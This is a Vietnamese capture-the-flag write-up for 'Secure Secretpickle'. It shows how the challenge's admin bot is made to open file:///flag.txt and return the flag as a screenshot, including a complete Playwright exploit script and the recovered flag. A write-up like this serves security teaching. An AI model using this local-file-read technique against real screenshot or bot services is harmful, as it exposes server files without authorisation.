# Secure Secretpickle

## Phân tích

Trong giao diện, action `adminbot` có mô tả:

```text
Have the adminbot visit a URL and screenshot it. URL must be base64.
```

Cho thấy tham số `params.url` phải là base64 của URL mà bot sẽ truy cập.

Nếu bot không chặn scheme nguy hiểm như `file://`, ta có thể yêu cầu bot truy cập:

```text
file:///flag.txt
```

Khi bot mở file này, nội dung flag sẽ được render trên trình duyệt headless. Sau đó action `adminbot` trả về screenshot dưới dạng ảnh base64. Ta chỉ cần tách ảnh ra và mở để đọc flag.

## Khai thác

Do secretpickle payload khi tự gửi trực tiếp qua path có thể gây lỗi `404` vì các ký tự đặc biệt trong base64, nên cách tốt hơn là dùng chính frontend của challenge.

Frontend sẽ tự parse query string, tự gọi `secretpickle_dump()`, rồi POST request đúng format lên server.

Ta dùng Playwright để mở URL frontend với query:

```text
/?a=adminbot&params.url=<base64-url>
```

Script:

```python
#!/usr/bin/env python3
import base64
import re
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

BASE = "https://deep-fried-tofu-over-charred-harissa-fbsq.gpn24.ctf.kitctf.de"

bot_url = "file:///flag.txt"
url_b64 = base64.b64encode(bot_url.encode()).decode()

targets = [
    f"{BASE}/?a=adminbot&params.url={quote(url_b64, safe='')}",
    f"{BASE}/?action=adminbot&params.url={quote(url_b64, safe='')}",
]

def extract_screenshot(html: str) -> bool:
    m = re.search(r"data:image/png;base64,([^\"']+)", html)
    if not m:
        return False

    Path("screenshot.png").write_bytes(base64.b64decode(m.group(1)))
    print("[+] saved screenshot.png")
    print("[+] open:")
    print("    explorer.exe screenshot.png")
    return True

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)

    for idx, target in enumerate(targets, 1):
        print(f"\n[+] trying target #{idx}:")
        print(target)

        page = browser.new_page()
        page.on("console", lambda msg: print("[console]", msg.type, msg.text))

        def on_dialog(dialog):
            print("[dialog]", dialog.type, dialog.message)
            dialog.accept()

        page.on("dialog", on_dialog)

        try:
            page.goto(target, wait_until="domcontentloaded", timeout=120000)

            try:
                page.wait_for_selector("img[src^='data:image/png;base64']", timeout=120000)
            except PlaywrightTimeoutError:
                print("[!] no screenshot img after timeout")

            html = page.content()
            text = page.locator("body").inner_text(timeout=5000)

            Path(f"debug_{idx}.html").write_text(html, encoding="utf-8")
            page.screenshot(path=f"debug_{idx}.png", full_page=True)

            print("[+] body text:")
            print(text[:3000])

            if extract_screenshot(html):
                browser.close()
                raise SystemExit(0)

        except Exception as e:
            print("[!] target failed:", repr(e))

        finally:
            page.close()

    browser.close()
```

Chạy script:

![alt text](image.png)


```bash
open screenshot.png
```

![alt text](image-1.png)

## Flag

```text
GPNCTF{THE_PicK13r__PickL3_ME_This}
```
